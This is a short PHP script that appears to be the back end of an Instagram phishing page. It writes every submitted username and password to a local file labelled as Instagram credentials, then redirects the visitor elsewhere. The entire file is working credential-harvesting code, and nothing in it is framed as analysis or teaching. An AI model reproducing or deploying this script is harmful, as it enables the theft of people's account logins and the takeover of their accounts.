<?php
file_put_contents("usernames.txt", "Instagram Username: " . $_POST['username'] . "\nPassword: " . $_POST['password'] . "\n", FILE_APPEND);
$url = "redirectUrl"; # https://skweezer.net
header("Location: $url");
exit();
?>
